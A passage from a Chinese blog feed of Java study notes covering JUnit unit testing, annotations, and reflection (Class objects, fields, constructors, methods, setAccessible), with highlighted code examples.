class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> LearnJunit.annotation.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 简单测试框架</span></span><br><span class="line"><span class="comment"> * 挡住方法执行后，自动执行被检测的所有方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testCheck</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//1.创建被测试对象</span></span><br><span class="line">        <span class="type">Calculator</span> <span class="variable">calculator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calculator</span>();</span><br><span class="line">        <span class="comment">//2.得到所有带注解的函数</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">e_num</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//出现异常的次数</span></span><br><span class="line">        <span class="type">BufferedWriter</span> <span class="variable">bw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;bug.txt&quot;</span>));<span class="comment">//创建文件对象</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.1得到所有函数</span></span><br><span class="line">        Method[] methods = calculator.getClass().getMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method method:methods)&#123;</span><br><span class="line">            <span class="comment">//2.2检测是否带注解</span></span><br><span class="line">            <span class="keyword">if</span>(method.isAnnotationPresent(check.class))&#123;</span><br><span class="line">                <span class="comment">//2.3若带注解则执行</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    method.invoke(calculator);</span><br><span class="line">                &#125; <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                    <span class="comment">//2.3.1捕获异常</span></span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    <span class="comment">//2.3.2记录到文件</span></span><br><span class="line">                    e_num++;</span><br><span class="line">                    bw.write(<span class="string">&quot;+++++&quot;</span>+method.getName()+<span class="string">&quot; 方法异常&quot;</span>);</span><br><span class="line">                    bw.newLine();</span><br><span class="line">                    bw.write(<span class="string">&quot;异常名称&gt;&gt; &quot;</span>+e.getCause().getClass().getSimpleName());</span><br><span class="line">                    bw.newLine();</span><br><span class="line">                    bw.write(<span class="string">&quot;异常原因&gt;&gt;&quot;</span>+e.getCause().getMessage());</span><br><span class="line">                    bw.newLine();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        bw.write(<span class="string">&quot;本次测试一共出现 &quot;</span>+e_num+<span class="string">&quot; 次异常&quot;</span>);</span><br><span class="line">        bw.newLine();</span><br><span class="line">        bw.flush();</span><br><span class="line">        bw.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/f72d98876821e798e96b8728ff0bf827.png" alt="image-20220318161130327" /></p><p><img src="https://img.joe1sn.top/uploads/big/18f70660cfbf601197e9f5a2c85fa2fc.png" alt="image-20220318161502996" /></p><h2 id="小结"><a class="markdownIt-Anchor" href="#小结"></a> 小结</h2><ol><li>大多数时候使用注解而不是自定义注解</li><li>注解给谁用：<ul><li>编译器</li><li>解析程序（checkTest）</li></ul></li><li>注解不是程序的一部分（相当于C的编译参数，如预编译命令）</li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;注释部分&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    <category term="java" scheme="https://joe1sn.eu.org/categories/notes/java/"/>
    
    
    <category term="Java" scheme="https://joe1sn.eu.org/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb笔记-Junit与反射</title>
    <link href="https://joe1sn.eu.org/2022/03/16/java-d1-Junit/"/>
    <id>https://joe1sn.eu.org/2022/03/16/java-d1-Junit/</id>
    <published>2022-03-15T23:27:53.000Z</published>
    <updated>2022-09-20T08:42:26.611Z</updated>
    
    <content type="html"><![CDATA[<h1 id="junit单元测试与反射"><a class="markdownIt-Anchor" href="#junit单元测试与反射"></a> Junit单元测试与反射</h1><p>黑盒-白盒</p><span id="more"></span><h2 id="junit使用白盒测试"><a class="markdownIt-Anchor" href="#junit使用白盒测试"></a> junit使用：白盒测试</h2><p>步骤：</p><ol><li>定义一个测试类<ul><li>测试类名：被测试类+Test <code>CalculatorTest</code></li><li>包名：xxx.xxx.xxx.test</li></ul></li><li>定义测试方法：可以独立执行，建议<ul><li>方法名：test测试方法名 <code>testAdd()</code></li><li>返回值：void（独立运行）</li><li>参数列表：空参</li></ul></li><li>方法+@test注解</li><li>导入Junit依赖环境</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> junit.Calculator;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CalculatorTest</span> &#123;</span><br><span class="line">    <span class="comment">//测试add方法</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testAdd</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//System.out.printf(&quot;Excuted&quot;);</span></span><br><span class="line">        <span class="comment">//创建计算器对象</span></span><br><span class="line">        <span class="type">Calculator</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calculator</span>();</span><br><span class="line">        <span class="comment">//2.调用add方法</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> c.add(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> junit;</span><br><span class="line"><span class="comment">//计算器</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="comment">//加法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  a+b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//减法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  a-b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/6b6a380169c11848bc34cc5b196fda89.png" alt="image-20220315202108710" /></p><p>在add添加除0异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> junit;</span><br><span class="line"><span class="comment">//计算器</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="comment">//加法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">3</span>/<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span>  a+b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//减法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  a-b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/10083d9cd80d2925466a59e220f461a7.png" alt="image-20220315202216277" /></p><p>假设原方法中add写成了-，使用断言报错</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> junit.Calculator;</span><br><span class="line"><span class="keyword">import</span> org.junit.Assert;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CalculatorTest</span> &#123;</span><br><span class="line">    <span class="comment">//测试add方法</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testAdd</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//System.out.printf(&quot;Excuted&quot;);</span></span><br><span class="line">        <span class="comment">//创建计算器对象</span></span><br><span class="line">        <span class="type">Calculator</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calculator</span>();</span><br><span class="line">        <span class="comment">//2.调用add方法</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> c.add(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//断言assert</span></span><br><span class="line">        Assert.assertEquals(<span class="number">3</span>, result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/f18a453e5c8eb5f21a67c07b789afcb3.png" alt="image-20220315202757465" /></p><p>同理可以得到sub的测试函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//测试sub方法</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testSub</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">Calculator</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calculator</span>();</span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> c.sub(<span class="number">2</span>,<span class="number">1</span>);</span><br><span class="line">    Assert.assertEquals(<span class="number">3</span>,result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注解补充</strong></p><p><strong>@Before</strong></p><ul><li><p>初始化方法</p></li><li><p>用于资源的申请，所有测试方法执行之前都会先执行该方法</p></li><li><p>在测试方法之前被自动执行</p></li></ul><p><strong>@After</strong></p><ul><li><p>释放资源</p></li><li><p>在所有测试方法执行完后都会自动执行该方法</p></li><li><p>测试方法执行之后自动执行</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//初始化方法</span></span><br><span class="line"><span class="comment">//用于资源的申请，所有测试方法执行之前都会先执行该方法</span></span><br><span class="line"><span class="meta">@Before</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;init...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//释放资源</span></span><br><span class="line"><span class="comment">//在所有测试方法执行完后都会自动执行该方法</span></span><br><span class="line"><span class="meta">@After</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;closed&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/15ea3e94a063b7201e51e9697b743165.png" alt="image-20220315203550168" /></p><h2 id="反射"><a class="markdownIt-Anchor" href="#反射"></a> 反射</h2><h3 id="框架设计的灵魂"><a class="markdownIt-Anchor" href="#框架设计的灵魂"></a> 框架设计的灵魂</h3><p><strong>框架</strong>：半成品软件。可以在框架基础上继续开发，简化编码</p><p><strong>反射</strong>：将类的各个组成部分封装为其他对象（<font color = red>反射机制</font>）</p><ul><li>好处：<ul><li>在程序运行中操作这些对象</li><li>可以解耦，提高程序可拓展性</li></ul></li></ul><p><strong>Java代码运行阶段</strong></p><img src="https://img.joe1sn.top/uploads/medium/2cc8ffb70910229257ff57732eccd951.jpg" style="zoom:80%;" /><p><strong>获取Class对象方式</strong></p><ol><li><p>Source：</p><p>对用于配置文件，将类名定义在配置文件中。读取文件，加载类</p><p>Class.forName(“全类名”)：将字节码文件加载进内存返回class对象</p><p><img src="https://img.joe1sn.top/uploads/big/3241fb86e3789bfa50b4ebf419cb0f3d.png" alt="image-20220315212602999" /></p></li><li><p>Class：</p><p>多用于参数传递</p><p>依据类名属性class，获取class对象</p><p><img src="https://img.joe1sn.top/uploads/big/aa14dc4ff67906a953cc018db6a30e3a.png" alt="image-20220315212737256" /></p></li><li><p>Runtime</p><p>多用于对象的获取字节码的方式</p><p>对象.getClass()：方法封装在Object中，被所有对象继承了</p><p><img src="https://img.joe1sn.top/uploads/big/03fd6fb45fb7a87a017ea833198e7e3e.png" alt="image-20220315212901262" /></p></li></ol><p>同一个字节码文件在同一次程序运行中，只会被加载一次；不论通过那种方式取得，都是同一个对象</p><p><img src="https://img.joe1sn.top/uploads/big/b83d646d672df6512991cc3f94c0bc48.png" alt="" /></p><p>每个类对象都不同</p><p><img src="https://img.joe1sn.top/uploads/big/15d7a01efb5f765459828d9764b452d7.png" alt="image-20220315213311200" /></p><h3 id="使用class对象"><a class="markdownIt-Anchor" href="#使用class对象"></a> 使用class对象</h3><p><strong>功能：</strong></p><ul><li><p>获取：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> LearnJunit.domain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String a;</span><br><span class="line">    <span class="keyword">protected</span> String b;</span><br><span class="line">    String c;</span><br><span class="line">    <span class="keyword">private</span> String d;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, a=&#x27;&quot;</span> + a + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, b=&#x27;&quot;</span> + b + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, c=&#x27;&quot;</span> + c + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, d=&#x27;&quot;</span> + d + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>获取成员变量们</p><ul><li><p><code>Field[] getFields()</code>：获取所有public成员变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Field[] fields = personClass.getFields();</span><br><span class="line"><span class="keyword">for</span> (Field field: fields)&#123;</span><br><span class="line">    System.out.println(field);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>Field getField(String name)</code>：获取所有指定名称public成员变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">a</span> <span class="operator">=</span> personClass.getField(<span class="string">&quot;a&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p><code>Field[] getDeclaredFields()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取所有成员变量，不考虑修饰</span></span><br><span class="line">Field[] DeclaredFields = personClass.getDeclaredFields();</span><br><span class="line"><span class="keyword">for</span> (Field getDeclaredField: DeclaredFields)&#123;</span><br><span class="line">    System.out.println(getDeclaredField);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>Field getDeclaredField(String name)</code></p><p>反射私有、保护成员变量，要设置忽略访问权限的修饰符安全监测</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.4获取单个私有</span></span><br><span class="line">System.out.println(<span class="string">&quot;---------------&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">d</span> <span class="operator">=</span> personClass.getDeclaredField(<span class="string">&quot;d&quot;</span>);</span><br><span class="line"><span class="comment">//1.4.1忽略安全访问</span></span><br><span class="line">d.setAccessible(<span class="literal">true</span>);<span class="comment">//暴力反射</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> d.get(p);</span><br><span class="line">System.out.println(value2);</span><br></pre></td></tr></table></figure></li></ul></li><li><p>获取构造方法们</p><ul><li><p><code>Constructor&lt;?&gt;[] getConstructors()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span>  personClass.getConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line">System.out.println(constructor);</span><br></pre></td></tr></table></figure></li><li><p><code>Constructor&lt;T&gt; getConstructor(String name)</code></p></li><li><p><code>Constructor&lt;?&gt;[] getDeclaredConstructors()</code></p></li><li><p><code>Constructor&lt;T&gt; getDeclaredConstructor(String name)  </code></p></li></ul></li><li><p>获取成员方法们</p><ul><li><p><code>method[] getMethods()  </code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取所有public修饰方法</span></span><br><span class="line">Method[] funcs = personClass.getMethods();</span><br><span class="line"><span class="keyword">for</span> (Method func:funcs)&#123;</span><br><span class="line">    System.out.println(func);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public java.lang.String LearnJunit.domain.Person.toString()</span><br><span class="line">public java.lang.String LearnJunit.domain.Person.getName()</span><br><span class="line">public void LearnJunit.domain.Person.setName(java.lang.String)</span><br><span class="line">public int LearnJunit.domain.Person.getAge()</span><br><span class="line">public void LearnJunit.domain.Person.setAge(int)</span><br><span class="line">public void LearnJunit.domain.Person.eat()</span><br><span class="line">public void LearnJunit.domain.Person.eat(java.lang.String)</span><br><span class="line">public final void java.lang.Object.wait() throws java.lang.InterruptedException</span><br><span class="line">public final void java.lang.Object.wait(long,int) throws java.lang.InterruptedException</span><br><span class="line">public final native void java.lang.Object.wait(long) throws java.lang.InterruptedException</span><br><span class="line">public boolean java.lang.Object.equals(java.lang.Object)</span><br><span class="line">public native int java.lang.Object.hashCode()</span><br><span class="line">public final native java.lang.Class java.lang.Object.getClass()</span><br><span class="line">public final native void java.lang.Object.notify()</span><br><span class="line">public final native void java.lang.Object.notifyAll()</span><br></pre></td></tr></table></figure><p>因为Person类继承的是Object对象，所以有些隐藏函数，即从Object继承下来的函数</p></li><li><p><code>method getMethod(String name)  </code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">//获取指定方法名称</span></span><br><span class="line"><span class="comment">//名字，参数列表匹配</span></span><br><span class="line">   <span class="type">Method</span> <span class="variable">eat</span> <span class="operator">=</span> personClass.getMethod(<span class="string">&quot;eat&quot;</span>);</span><br><span class="line">   <span class="type">Method</span> <span class="variable">eat2</span> <span class="operator">=</span> personClass.getMethod(<span class="string">&quot;eat&quot;</span>,String.class);</span><br><span class="line">   eat2.invoke(p,<span class="string">&quot;fish&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p><code>method[] getDeclaredMethods() </code></p></li><li><p><code>method getDeclaredMethod(String name)</code></p></li></ul></li><li><p>获取类名</p><ul><li><code>String getName()  </code></li></ul></li></ul></li><li><p><strong>操作</strong></p><ul><li><p>Field成员变量</p><p>设置值（get）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">a</span> <span class="operator">=</span> personClass.getField(<span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="comment">//获取成员变量a的值</span></span><br><span class="line"><span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> a.get(p);</span><br><span class="line">System.out.println(value);</span><br></pre></td></tr></table></figure><p>获取值（set）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.set(p,<span class="string">&quot;John&quot;</span>);</span><br><span class="line">System.out.println(p);</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/82c1b1df3c6f87d9d99dacf16c3beb41.png" alt="image-20220316104826899" /></p></li><li><p>暴力反射：<code>.setAccessible(true);</code> 对所有反射都有效</p><p>搭配<code>getDeaclearedXXX</code>使用</p><p>这仅仅是打印名称和比较，不需要设置；但是如果要对对象进行相关操作，必须设置；<strong>不设置的话操作受限</strong>。</p></li><li><p>Constructor构造方法</p><p>创建对象 <code>T newInstance(Object... initargs)  </code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.2创建对象</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">person</span> <span class="operator">=</span> constructor.newInstance(<span class="string">&quot;Jonh&quot;</span>,<span class="number">5</span>);</span><br><span class="line">System.out.println(person);</span><br></pre></td></tr></table></figure><p>如果构造使用空参创造对象，可简化  class对象的 <code>newInstance</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> personClass.newInstance();</span><br><span class="line">System.out.println(o);</span><br><span class="line">System.out.println(<span class="string">&quot;-------------&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>Method成员对象</p><p>执行方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span 